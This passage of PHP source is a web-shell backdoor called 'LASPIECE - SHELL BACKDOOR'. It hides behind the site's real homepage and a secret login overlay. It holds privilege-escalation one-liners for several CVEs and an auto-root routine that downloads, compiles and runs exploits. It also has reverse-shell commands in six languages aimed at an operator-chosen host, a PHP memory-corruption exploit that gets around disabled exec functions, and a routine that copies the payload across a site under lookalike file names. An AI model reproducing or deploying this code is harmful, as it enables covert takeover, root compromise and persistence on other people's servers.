                $exploits[] = ['cve'=>'CVE-2023-2640','name'=>'GameOver(lay)','desc'=>'Ubuntu OverlayFS one-liner','severity'=>'CRITICAL','url'=>'','compile'=>'','run'=>"unshare -rm sh -c \"mkdir l u w m && cp /u*/b*/p]asswd l/;setfattr -n trusted.overlay.metacopy -v y l/passwd;mount -t overlay overlay -o lowerdir=l,upperdir=u,workdir=w m && touch m/passwd && u/passwd\""];
            }
        }
        // Sudo bypass CVE-2019-14287
        if (!empty($sudoVer) && preg_match('/(\d+\.\d+\.\d+)/', $sudoVer, $sv2)) {
            if (version_compare($sv2[1], '1.8.28', '<')) {
                $exploits[] = ['cve'=>'CVE-2019-14287','name'=>'Sudo Bypass','desc'=>'Sudo -u#-1 bypass','severity'=>'MEDIUM','url'=>'','compile'=>'','run'=>'sudo -u#-1 /bin/bash'];
            }
        }
        // Netfilter CVE-2022-25636
        if ($kMajor == 5 && $kMinor >= 4 && $kMinor <= 6) {
            $exploits[] = ['cve'=>'CVE-2022-25636','name'=>'Netfilter OOB','desc'=>'nf_tables OOB write','severity'=>'HIGH','url'=>'','compile'=>'gcc exploit.c -o exploit -lmnl -lnftnl','run'=>'./exploit'];
        }
        // Docker socket
        if ($dockerSock === 'yes') {
            $exploits[] = ['cve'=>'N/A','name'=>'Docker Socket','desc'=>'Escape via docker.sock','severity'=>'HIGH','url'=>'','compile'=>'','run'=>'docker run -v /:/mnt --rm -it alpine chroot /mnt sh'];
        }
        // SUID check
        $suidExploits = [];
        $dangerSuid = ['nmap','vim','find','bash','python','python3','perl','ruby','php','env','awk','less','more','ftp','socat','wget','curl','nc','ncat','node','lua'];
        foreach (explode("\n", $suidBins) as $sb) {
            $bn = basename(trim($sb));
            if (in_array($bn, $dangerSuid)) $suidExploits[] = ['bin'=>trim($sb),'name'=>$bn];
        }
        echo json_encode(['ok'=>true,'info'=>['kernel'=>$kernel,'kernel_full'=>$kernelAll,'os'=>$os,'arch'=>$arch,'user'=>$whoami,'uid'=>$uid,'gcc'=>$gcc?:'not found','writable_dir'=>$writable?:'none','sudo'=>$sudoVer,'pkexec'=>$pkexecVer,'glibc'=>$glibcVer,'docker_sock'=>$dockerSock,'in_docker'=>$inDocker],'exploits'=>$exploits,'suid_exploits'=>$suidExploits,'suid_bins'=>$suidBins]);
        exit;
    }

    // === AUTO ROOT - EXECUTE ===
    if ($fAct === 'auto_root_exec') {
        $exploitUrl = $_POST['exploit_url'] ?? '';
        $compileCmd2 = $_POST['compile_cmd'] ?? '';
        $runCmd3 = $_POST['run_cmd'] ?? '';
        $customCmd = $_POST['custom_cmd'] ?? '';
        $workDir = is_writable('/tmp') ? '/tmp' : (is_writable('/dev/shm') ? '/dev/shm' : '/var/tmp');
        $workDir .= '/.lp_' . substr(md5(rand()), 0, 8);
        @mkdir($workDir, 0755, true);
        $log = '';
        if (!empty($customCmd)) {
            $log .= "[*] Custom command...\n";
            $log .= safeExec("cd $workDir && $customCmd 2>&1") ?: '(no output)';
        } else {
            if (!empty($exploitUrl)) {
                $log .= "[*] Downloading exploit...\n";
                $dl = safeExec("cd $workDir && curl -fsSL -o exploit_src.c '$exploitUrl' 2>&1");
                if (empty($dl)) $dl = safeExec("cd $workDir && wget -q -O exploit_src.c '$exploitUrl' 2>&1");
                $fsize = @filesize("$workDir/exploit_src.c");
                $log .= "Downloaded: " . ($fsize ?: 0) . " bytes\n\n";
            }
            if (!empty($compileCmd2)) {
                $log .= "[*] Compiling...\n";
                $log .= (safeExec("cd $workDir && $compileCmd2 2>&1") ?: "(done)") . "\n\n";
            }
            if (!empty($runCmd3)) {
                $log .= "[*] Executing exploit...\n";
                safeExec("cd $workDir && chmod +x * 2>/dev/null");
                $log .= (safeExec("cd $workDir && $runCmd3 2>&1") ?: "(no output)") . "\n";
            }
        }
        $postWho = trim(safeExec('whoami 2>/dev/null') ?: '');
        $postId = trim(safeExec('id 2>/dev/null') ?: '');
        $isRoot = ($postWho === 'root' || strpos($postId, 'uid=0') !== false);
        $log .= "\n=== Result ===\nUser: $postWho\nID: $postId\nRoot: " . ($isRoot ? 'YES!' : 'NO');
        safeExec("rm -rf $workDir 2>/dev/null");
        echo json_encode(['ok'=>true,'log'=>$log,'is_root'=>$isRoot,'user'=>$postWho,'id'=>$postId]);
        exit;
    }

    if ($fAct === 'create_symlink') {
        $target = $_POST['symlink_target'] ?? '';
        $linkName = $_POST['symlink_name'] ?? '';
        $dir = $_POST['target_dir'] ?? '';
        if (empty($target) || empty($linkName) || empty($dir)) {
            echo json_encode(['err' => 'Target path, link name, and directory are required']); exit;
        }
        @chmod($dir, 0755);
        $linkPath = rtrim($dir, '/') . '/' . $linkName;
        if (file_exists($linkPath) || is_link($linkPath)) {
            echo json_encode(['err' => 'A file or link with that name already exists']); exit;
        }
        if (@symlink($target, $linkPath)) {
            echo json_encode(['ok' => true, 'msg' => 'Symlink created: ' . $linkName . ' -> ' . $target]);
        } else {
            $err = error_get_last();
            echo json_encode(['err' => 'Failed to create symlink' . ($err ? ': ' . $err['message'] : '')]);
        }
        exit;
    }

    if ($fAct === 'backconnect') {
        $bt = $_POST['bc_type'] ?? 'php';
        $bh = $_POST['bc_host'] ?? '';
        $bp = intval($_POST['bc_port'] ?? 0);
        if (!$bh || $bp < 1 || $bp > 65535) {
            echo json_encode(['err' => 'Valid host and port (1-65535) required']); exit;
        }
        // Check disabled functions
        $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
        $availExec = [];
        foreach (['exec','shell_exec','system','passthru','popen','proc_open'] as $fn) {
            if (function_exists($fn) && !in_array($fn, $disabled)) $availExec[] = $fn;
        }

        $cmd = '';
        switch ($bt) {
            case 'perl':
                $cmd = 'perl -e \'use Socket;$i="'.$bh.'";$p='.$bp.';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\' &';
                break;
            case 'python':
                $cmd = 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'.$bh.'",'.$bp.'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\' &';
                break;
            case 'nc':
                $nb = trim(@shell_exec('which nc 2>/dev/null') ?: @shell_exec('which ncat 2>/dev/null') ?: 'nc');
                $cmd = "$nb -e /bin/sh $bh $bp &";
                break;
            case 'bash':
                $cmd = "bash -c 'bash -i >& /dev/tcp/$bh/$bp 0>&1' &";
                break;
            case 'ruby':
                $cmd = 'ruby -rsocket -e \'f=TCPSocket.open("'.$bh.'",'.$bp.').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\' &';
                break;
            default: // PHP
                if (!in_array('proc_open', $availExec)) {
                    // Try fsockopen method
                    $sock = @fsockopen($bh, $bp, $en, $es, 10);
                    if (!$sock) { echo json_encode(['err' => "Connection failed: $es ($en)"]); exit; }
                    // Simple PHP reverse shell via fsockopen
                    $sh = @popen('/bin/sh -i', 'r');
                    if (!$sh) {
                        @fclose($sock);
                        echo json_encode(['err' => 'Cannot spawn shell (proc_open/popen disabled)']); exit;
                    }
                    @fclose($sock);
                    echo json_encode(['ok' => true, 'msg' => "PHP backconnect attempted to $bh:$bp (limited mode)"]); exit;
                }
                $sock = @fsockopen($bh, $bp, $en, $es, 10);
                if (!$sock) { echo json_encode(['err' => "Connection failed: $es ($en)"]); exit; }
                $descriptors = [0 => $sock, 1 => $sock, 2 => $sock];
                $proc = @proc_open('/bin/sh -i', $descriptors, $pipes);
                if (!is_resource($proc)) {
                    @fclose($sock);
                    echo json_encode(['err' => 'proc_open failed to spawn shell']); exit;
                }
                echo json_encode(['ok' => true, 'msg' => "PHP backconnect established to $bh:$bp"]); exit;
        }

        // Execute shell-based backconnect
        if (empty($availExec)) {
            echo json_encode(['err' => 'No exec functions available. Disabled: ' . ini_get('disable_functions')]); exit;
        }
        $out = '';
        if (in_array('exec', $availExec)) { @exec($cmd . ' 2>&1', $oa); $out = implode("\n", $oa ?? []); }
        elseif (in_array('shell_exec', $availExec)) { $out = @shell_exec($cmd . ' 2>&1') ?: ''; }
        elseif (in_array('system', $availExec)) { ob_start(); @system($cmd . ' 2>&1'); $out = ob_get_clean(); }
        elseif (in_array('passthru', $availExec)) { ob_start(); @passthru($cmd . ' 2>&1'); $out = ob_get_clean(); }
        elseif (in_array('popen', $availExec)) { $p = @popen($cmd . ' 2>&1', 'r'); if ($p) { $out = @fread($p, 4096); @pclose($p); } }
        echo json_encode([
            'ok' => true,
            'msg' => ucfirst($bt) . " backconnect launched to $bh:$bp",
            'output' => $out,
            'exec_used' => $availExec[0] ?? 'none'
        ]); exit;
    }

    echo json_encode(['err' => 'unknown file action']);
    exit;
}
// === END FILE OPERATION HANDLER ===

function lp_get_home_url() {
    $scheme = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http');
    $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
    return $scheme . '://' . $host . '/';
}

function fetchHomepage() {
    $homeUrl = lp_get_home_url();
    
    $ctx = @stream_context_create([
        'http' => [
            'method' => 'GET',
            'header' => "User-Agent: Mozilla/5.0\r\nAccept: text/html\r\n",
            'timeout' => 10,
            'ignore_errors' => true,
        ],
        'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
    ]);
    
    $homepage = @file_get_contents($homeUrl, false, $ctx);
    if ($homepage !== false && strlen($homepage) > 100) return $homepage;
    
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $homeUrl,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0',
        ]);
        $homepage = curl_exec($ch);
        curl_close($ch);
        if ($homepage !== false && strlen($homepage) > 100) return $homepage;
    }
    
    return null;
}

// === GATE: No param = show real homepage, no trace ===
if (!isAuthenticated()) {
    if (!$SECRET_PARAM) {
        $homepage = fetchHomepage();
        if ($homepage !== null) {
            echo $homepage;
            exit;
        }
        header('Location: /');
        exit;
    }
    
    // Auto-login via URL: ?lastpiece=hacktivist&password=xxx
    if (isset($_GET['password']) && !empty($_GET['password'])) {
        if (authenticate($_GET['password'])) {
            $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
            $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
            $scriptName = $_SERVER['SCRIPT_NAME'] ?? '';
            header('Location: ' . $scheme . '://' . $host . $scriptName . '?lastpiece=hacktivist');
            exit;
        }
    }
    
    // Has param but not authenticated: show real homepage + hidden login
    $loginError = '';
    if (isset($_POST['login_password'])) {
        if (authenticate($_POST['login_password'])) {
            $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
            $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
            $scriptName = $_SERVER['SCRIPT_NAME'] ?? '';
            header('Location: ' . $scheme . '://' . $host . $scriptName . '?lastpiece=hacktivist');
            exit;
        } else {
            $loginError = 'Invalid password';
        }
    }
    
    $homepage = fetchHomepage();
    if ($homepage !== null) {
        $loginForm = '
<style>
#_lp_overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.92);backdrop-filter:blur(8px);z-index:999999;justify-content:center;align-items:center;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
#_lp_overlay.show{display:flex}
#_lp_box{background:linear-gradient(145deg,#1a1a2e,#0d0d1a);padding:32px;border-radius:16px;border:1px solid rgba(255,215,0,0.2);box-shadow:0 25px 80px rgba(0,0,0,0.6),0 0 60px rgba(255,215,0,0.08);max-width:380px;width:90%;text-align:center}
#_lp_box h3{color:#ffd700;margin:0 0 6px;font-size:22px;font-weight:700}
#_lp_box p{color:#666;margin:0 0 24px;font-size:12px}
#_lp_box label{display:block;text-align:left;color:#888;font-size:11px;margin-bottom:6px;font-weight:500}
#_lp_box input{width:100%;padding:12px 14px;background:rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.1);color:#fff;border-radius:8px;font-size:14px;outline:none;box-sizing:border-box;transition:border-color 0.2s}
#_lp_box input:focus{border-color:#ffd700}
#_lp_box button{width:100%;padding:12px;background:linear-gradient(135deg,#ffd700,#ff8c00);border:none;border-radius:8px;color:#000;font-weight:700;font-size:14px;cursor:pointer;margin-top:16px;transition:transform 0.2s,box-shadow 0.2s}
#_lp_box button:hover{transform:translateY(-2px);box-shadow:0 6px 25px rgba(255,215,0,0.4)}
#_lp_box .hint{color:#444;font-size:10px;margin-top:16px}
#_lp_err{background:rgba(248,81,73,0.15);border:1px solid rgba(248,81,73,0.3);color:#f85149;padding:10px;border-radius:6px;margin-bottom:16px;font-size:12px}
</style>
<div id="_lp_overlay">
<form id="_lp_box" method="POST">
<h3>LASPIECE - SHELL BACKDOOR</h3>
<p>Authentication Required</p>
' . ($loginError ? '<div id="_lp_err">' . htmlspecialchars($loginError) . '</div>' : '') . '
<label>Password</label>
<input type="password" name="login_password" id="_lp_pwd" placeholder="Enter password" required autocomplete="off">
<button type="submit">GASS</button>
<div class="hint">Press ESC to close</div>
</form>
</div>
<script>
document.addEventListener("keydown",function(e){
if(e.key==="p"||e.key==="P"){var o=document.getElementById("_lp_overlay");if(o){o.classList.toggle("show");if(o.classList.contains("show"))document.getElementById("_lp_pwd").focus();}}
if(e.key==="Escape"){var o=document.getElementById("_lp_overlay");if(o)o.classList.remove("show");}
});
</script>';
        $homepage = str_replace('</body>', $loginForm . '</body>', $homepage);
        echo $homepage;
        exit;
    }
    
    header('Location: /');
    exit;
}

// === AUTHENTICATED: File Manager starts here ===
// Track first access for FBI sound (works with both password and nopass)
$justLoggedIn = !isset($_SESSION['fbi_played']);
if ($justLoggedIn) { $_SESSION['fbi_played'] = true; }

if (isset($_POST['logout'])) {
    logout();
    header('Location: ' . $_SERVER['SCRIPT_NAME']);
    exit;
}

@ob_clean();
@header("X-Accel-Buffering: no");
@header("Content-Encoding: none");

// === BYPASS ENGINE (PHP UAF) ===
class Helper { public $a, $b, $c; }
class Pwn {
    const LOGGING = false;
    const CHUNK_DATA_SIZE = 0x60;
    const CHUNK_SIZE = self::CHUNK_DATA_SIZE;
    const STRING_SIZE = self::CHUNK_DATA_SIZE - 0x18 - 1;
    const HT_SIZE = 0x118;
    const HT_STRING_SIZE = self::HT_SIZE - 0x18 - 1;

    public function __construct($cmd) {
        for($i = 0; $i < 10; $i++) {
            $groom[] = self::alloc(self::STRING_SIZE);
            $groom[] = self::alloc(self::HT_STRING_SIZE);
        }
        $concat_str_addr = self::str2ptr($this->heap_leak(), 16);
        $fill = self::alloc(self::STRING_SIZE);
        $this->abc = self::alloc(self::STRING_SIZE);
        $abc_addr = $concat_str_addr + self::CHUNK_SIZE;
        $this->free($abc_addr);
        $this->helper = new Helper;
        if(strlen($this->abc) < 0x1337) return;
        $this->helper->a = "leet";
        $this->helper->b = function($x) {};
        $this->helper->c = 0xfeedface;
        $helper_handlers = $this->rel_read(0);
        $closure_addr = $this->rel_read(0x20);
        $closure_ce = $this->read($closure_addr + 0x10);
        $basic_funcs = $this->get_basic_funcs($closure_ce);
        $zif_system = $this->get_system($basic_funcs);
        $fake_closure_off = 0x70;
        for($i = 0; $i < 0x138; $i += 8) {
            $this->rel_write($fake_closure_off + $i, $this->read($closure_addr + $i));
        }
        $this->rel_write($fake_closure_off + 0x38, 1, 4);
        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;
        $this->rel_write($fake_closure_off + $handler_offset, $zif_system);
        $fake_closure_addr = $abc_addr + $fake_closure_off + 0x18;
        $this->rel_write(0x20, $fake_closure_addr);
        ($this->helper->b)($cmd);
        $this->rel_write(0x20, $closure_addr);
        unset($this->helper->b);
    }
    private function heap_leak() {
        $arr = [[], []];
        set_error_handler(function() use (&$arr, &$buf) {
            $arr = 1;
            $buf = str_repeat("\x00", self::HT_STRING_SIZE);
        });
        $arr[1] .= self::alloc(self::STRING_SIZE - strlen("Array"));
        return $buf;
    }
    private function free($addr) {
        $payload = pack("Q*", 0xdeadbeef, 0xcafebabe, $addr);
        $payload .= str_repeat("A", self::HT_STRING_SIZE - strlen($payload));
        $arr = [[], []];
        set_error_handler(function() use (&$arr, &$buf, &$payload) {
            $arr = 1;
            $buf = str_repeat($payload, 1);
        });
        $arr[1] .= "x";
    }
    private function rel_read($offset) { return self::str2ptr($this->abc, $offset); }
    private function rel_write($offset, $value, $n = 8) {
        for ($i = 0; $i < $n; $i++) {
            $this->abc[$offset + $i] = chr($value & 0xff);
            $value >>= 8;
        }
    }
    private function read($addr, $n = 8) {
        $this->rel_write(0x10, $addr - 0x10);
        $value = strlen($this->helper->a);
        if($n !== 8) { $value &= (1 << ($n << 3)) - 1; }
        return $value;
    }
    private function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = $this->read($addr);
            $f_name = $this->read($f_entry, 6);
            if($f_name === 0x6d6574737973) return $this->read($addr + 8);
            $addr += 0x20;
        } while($f_entry !== 0);
    }
    private function get_basic_funcs($addr) {
        while(true) {
            $addr -= 0x10;
            if($this->read($addr, 4) === 0xA8 &&
                in_array($this->read($addr + 4, 4), [20180731, 20190902, 20200930, 20210902])) {
                $module_name_addr = $this->read($addr + 0x20);
                $module_name = $this->read($module_name_addr);
                if($module_name === 0x647261646e617473) return $this->read($addr + 0x28);
            }
        }
    }
    static function alloc($size) { return str_shuffle(str_repeat("A", $size)); }
    static function str2ptr($str, $p = 0, $n = 8) {
        $address = 0;
        for($j = $n - 1; $j >= 0; $j--) { $address <<= 8; $address |= ord($str[$p + $j]); }
        return $address;
    }
}

function runBypass($cmd) {
    ob_start();
    try { new Pwn($cmd); } catch(\Throwable $e) {}
    $out = ob_get_clean();
    return (!empty(trim($out ?? ''))) ? trim($out) : null;
}

// === CORE FUNCTIONS ===
function runCmd($cmd) {
    $out = null;
    $user = get_current_user();
    $home = getenv('HOME') ?: ('/home/' . $user);
    $env = "HOME=$home USER=$user";
    $fullCmd = $env . ' /bin/bash -l -c ' . escapeshellarg($cmd) . ' 2>&1';
    if (function_exists('proc_open')) {
        $desc = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']];
        $envArr = ['HOME' => $home, 'USER' => $user, 'PATH' => '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'];
        $proc = @proc_open('/bin/bash -l -c ' . escapeshellarg($cmd), $desc, $pipes, $home, $envArr);
        if (is_resource($proc)) {
            @fclose($pipes[0]);
            $out = @stream_get_contents($pipes[1]);
            $err = @stream_get_contents($pipes[2]);
            @fclose($pipes[1]);
            @fclose($pipes[2]);
            @proc_close($proc);
            if (empty(trim($out ?? '')) && !empty(trim($err ?? ''))) $out = $err;
        }
    }
    if ($out === null && function_exists('exec')) {
        @exec($fullCmd, $outArr, $ret);
        $out = implode("\n", $outArr);
    }
    if ($out === null && function_exists('shell_exec')) {
        $out = @shell_exec($fullCmd);
    }
    if ($out === null && function_exists('popen')) {
        $fp = @popen($fullCmd, 'r');
        if ($fp) { $out = @stream_get_contents($fp); @pclose($fp); }
    }
    // Fallback: UAF bypass when all exec functions are disabled
    if ($out === null || trim($out) === '') {
        $out = runBypass($cmd);
    }
    return $out;
}

function runUapi($args) {
    return runCmd('uapi ' . $args);
}

function parseUapiStatus($raw) {
    if (empty($raw)) return ['ok' => false, 'raw' => ''];
    $ok = (bool)preg_match('/status:\s*1/', $raw);
    return ['ok' => $ok, 'raw' => $raw];
}

function parseUapiFtpList($raw) {
    if (empty($raw)) return [];
    $accounts = [];
    $blocks = preg_split('/^\s*-\s*$/m', $raw);
    foreach ($blocks as $block) {
        $acct = [];
        if (preg_match('/\buser:\s*(.+)/i', $block, $m)) $acct['user'] = trim($m[1], " '\"\r\n");
        if (preg_match('/\blogin:\s*(.+)/i', $block, $m)) $acct['login'] = trim($m[1], " '\"\r\n");
        if (preg_match('/\bdomain:\s*(.+)/i', $block, $m)) $acct['domain'] = trim($m[1], " '\"\r\n");
        if (preg_match('/\bhomedir:\s*(.+)/i', $block, $m)) $acct['homedir'] = trim($m[1], " '\"\r\n");
        if (preg_match('/\bdiskquota:\s*(.+)/i', $block, $m)) $acct['quota'] = trim($m[1], " '\"\r\n");
        if (preg_match('/\bdiskused:\s*(.+)/i', $block, $m)) $acct['used'] = trim($m[1], " '\"\r\n");
        if (!empty($acct['user']) || !empty($acct['login'])) $accounts[] = $acct;
    }
    if (empty($accounts)) {
        preg_match_all('/(?:user|login):\s*[\'"]?(\S+)[\'"]?/i', $raw, $userMatches);
        preg_match_all('/domain:\s*[\'"]?(\S+)[\'"]?/i', $raw, $domainMatches);
        preg_match_all('/homedir:\s*[\'"]?(\S+)[\'"]?/i', $raw, $dirMatches);
        for ($i = 0; $i < count($userMatches[1]); $i++) {
            $accounts[] = [
                'user' => $userMatches[1][$i] ?? '',
                'login' => $userMatches[1][$i] ?? '',
                'domain' => $domainMatches[1][$i] ?? '',
                'homedir' => $dirMatches[1][$i] ?? '',
            ];
        }
    }
    return $accounts;
}

function formatSize($size) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($size >= 1024 && $i < 4) { $size /= 1024; $i++; }
    return round($size, 2) . ' ' . $units[$i];
}

function fixPermission($path) {
    $perms = @fileperms($path);
    if ($perms === false) return false;
    $octal = substr(sprintf('%o', $perms), -4);
    $unwritable = ['0555','0444','0111','0000','0550','0440','0110','0554','0445','0511','0155','0144'];
    if (in_array($octal, $unwritable)) {
        if (is_dir($path)) {
            @chmod($path, 0755);
        } else {
            @chmod($path, 0644);
        }
        return true;
    }
    return false;
}

function safeAccess($path) {
    fixPermission($path);
    return @is_readable($path);
}

function getFileDetails($path) {
    $folders = [];
    $files = [];
    try {
        if (!safeAccess($path)) return 'None';
        $items = @scandir($path);
        if (!is_array($items)) return 'None';
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            $itemPath = $path . '/' . $item;
            $perm = @fileperms($itemPath);
            $permStr = $perm !== false ? substr(sprintf('%o', $perm), -4) : '----';
            $size = '';
            if (!is_dir($itemPath)) {
                $s = @filesize($itemPath);
                $size = $s !== false ? formatSize($s) : '?';
            }
            $isWritable = @is_writable($itemPath);
            $isReadable = @is_readable($itemPath);
            $permColor = '#f85149';
            if ($isWritable && $isReadable) $permColor = '#3fb950';
            elseif ($isReadable) $permColor = '#e6edf3';
            $detail = [
                'name' => $item,
                'type' => is_dir($itemPath) ? 'Folder' : 'File',
                'size' => $size,
                'permission' => $permStr,
                'perm_color' => $permColor,
                'writable' => $isWritable,
                'readable' => $isReadable,
            ];
            if (is_dir($itemPath)) $folders[] = $detail;
            else $files[] = $detail;
        }
        return array_merge($folders, $files);
    } catch (Exception $e) {
        return 'None';
    }
}

function executeCommand($command) {
    $currentDirectory = getCurrentDirectory();
    $fullCmd = "cd " . escapeshellarg($currentDirectory) . " && " . $command;
    $out = runCmd($fullCmd);
    if ($out !== null && !empty(trim($out))) return trim($out);
    // Final fallback: direct bypass without cd
    $out = runBypass($command);
    if ($out !== null && !empty(trim($out))) return trim($out);
    return 'No output or command failed.';
}

function readFileContent($file) { return @file_get_contents($file); }

function saveFileContent($file) {
    if (isset($_POST['content'])) {
        fixPermission($file);
        fixPermission(dirname($file));
        return @file_put_contents($file, $_POST['content']) !== false;
    }
    return false;
}

function uploadFile($targetDirectory) {
    if (isset($_FILES['file'])) {
        fixPermission($targetDirectory);
        $targetFile = $targetDirectory . '/' . basename($_FILES['file']['name']);
        if ($_FILES['file']['size'] === 0) return 'Empty file.';
        if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) return 'File uploaded successfully.';
        return 'Error uploading file.';
    }
    return '';
}

function uploadMultipleFiles($targetDirectory) {
    if (!isset($_FILES['files'])) return 'No files selected.';
    fixPermission($targetDirectory);
    $success = 0; $fail = 0;
    for ($i = 0; $i < count($_FILES['files']['name']); $i++) {
        if ($_FILES['files']['error'][$i] === 0 && !empty($_FILES['files']['name'][$i])) {
            $target = $targetDirectory . '/' . basename($_FILES['files']['name'][$i]);
            if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $target)) $success++;
            else $fail++;
        }
    }
    return "Uploaded: $success, Failed: $fail";
}

function getCurrentDirectory() { return realpath(getcwd()); }

function deleteFile($file) {
    fixPermission($file);
    fixPermission(dirname($file));
    if (file_exists($file)) {
        if (is_dir($file)) return deleteFolder($file);
        if (@unlink($file)) return true;
    }
    return false;
}

function deleteFolder($folder) {
    fixPermission($folder);
    if (is_dir($folder)) {
        $items = @scandir($folder);
        if (is_array($items)) {
            foreach ($items as $item) {
                if ($item == '.' || $item == '..') continue;
                $path = $folder . '/' . $item;
                fixPermission($path);
                if (is_dir($path)) deleteFolder($path);
                else @unlink($path);
            }
        }
        return @rmdir($folder);
    }
    return false;
}

function renameFile($oldName, $newName) {
    fixPermission($oldName);
    fixPermission(dirname($oldName));
    if (file_exists($oldName)) {
        $directory = dirname($oldName);
        $newPath = $directory . '/' . $newName;
        if (@rename($oldName, $newPath)) return 'Renamed successfully.';
        return 'Error renaming.';
    }
    return 'File does not exist.';
}

function scanDeepestDirectory($basePath) {
    $deepest = []; $maxDepth = 0;
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iterator as $item) {
            if ($item->isDir()) {
                $depth = $iterator->getDepth();
                if ($depth > $maxDepth) { $maxDepth = $depth; $deepest = [$item->getPathname()]; }
                elseif ($depth == $maxDepth) { $deepest[] = $item->getPathname(); }
            }
        }
    } catch (Exception $e) {}
    return $deepest;
}

function scanNewlyFiles($basePath, $ext = 'php', $limit = 50) {
    $files = [];
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS)
        );
        foreach ($iterator as $item) {
            if ($item->isFile() && strtolower($item->getExtension()) === $ext) {
                $files[] = ['path' => $item->getPathname(), 'time' => $item->getMTime()];
            }
        }
    } catch (Exception $e) {}
    usort($files, function($a, $b) { return $b['time'] - $a['time']; });
    return array_slice($files, 0, $limit);
}

function generateHomoglyph($filename) {
    $name = pathinfo($filename, PATHINFO_FILENAME);
    $ext = pathinfo($filename, PATHINFO_EXTENSION);
    $map = [
        'a' => ['@','4'],
        'e' => ['3'],
        'i' => ['1','l'],
        'o' => ['0'],
        's' => ['5'],
        'l' => ['1','I'],
        'g' => ['9'],
        'c' => ['('],
        't' => ['7'],
        'I' => ['l','1'],
        'O' => ['0'],
        'S' => ['5'],
        'A' => ['4','@'],
        'E' => ['3'],
        'B' => ['8'],
        'G' => ['6'],
        'T' => ['7'],
    ];
    $variants = [];
    $len = strlen($name);
    for ($i = 0; $i < $len; $i++) {
        $ch = $name[$i];
        if (isset($map[$ch])) {
            foreach ($map[$ch] as $rep) {
                $v = substr($name, 0, $i) . $rep . substr($name, $i + 1);
                $full = $ext ? $v . '.' . $ext : $v;
                if ($full !== $filename) $variants[] = $full;
            }
        }
    }
    if (empty($variants)) {
        $variants[] = '.' . $filename;
        $variants[] = $name . '_bak.' . $ext;
    }
    return array_unique($variants);
}

function massSpreadAuto($basePath, $content) {
    $count = 0; $errors = []; $created = [];
    $targetExts = ['php'];
    try {
        fixPermission($basePath);
        $dirs = [$basePath];
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iterator as $item) {
            if ($item->isDir()) $dirs[] = $item->getPathname();
        }
        foreach ($dirs as $dir) {
            fixPermission($dir);
            $files = @scandir($dir);
            if (!is_array($files)) { $errors[] = $dir; continue; }
            $existingFiles = [];
            foreach ($files as $f) {
                if ($f === '.' || $f === '..') continue;
                if (is_file($dir . '/' . $f)) {
                    $fext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
                    if (in_array($fext, $targetExts)) $existingFiles[] = $f;
                }
            }
            if (empty($existingFiles)) {
                $existingFiles = ['index.php', 'config.php', 'class-loader.php'];
            }
            $placed = false;
            foreach ($existingFiles as $origFile) {
                $variants = generateHomoglyph($origFile);
                foreach ($variants as $variant) {
                    $targetPath = $dir . '/' . $variant;
                    if (!file_exists($targetPath)) {
                        if (@file_put_contents($targetPath, $content) !== false) {
                            $count++;
                            $created[] = $targetPath;
                            $placed = true;
                            break 2;
                        }
                    }
                }
            }
            if (!$placed) $errors[] = $dir;
        }
    } catch (Exception $e) {
        $errors[] = 'Exception: ' . $e->getMessage();
    }
    return ['count' => $count, 'errors' => $errors, 'created' => $created];
}



// === HANDLE REQUESTS ===
$currentDirectory = getCurrentDirectory();
$errorMessage = '';
$responseMessage = '';
$cmdOutput = '';
$loginError = '';

if (isset($_GET['lph'])) {
    @chdir($_GET['lph']);
    $currentDirectory = getCurrentDirectory();
}

if (isset($_POST['multi_upload'])) {
    $responseMessage = uploadMultipleFiles($currentDirectory);
}

if (isset($_POST['newfolder']) && !empty($_POST['foldername'])) {
    $newDir = $currentDirectory . '/' . $_POST['foldername'];
    fixPermission($currentDirectory);
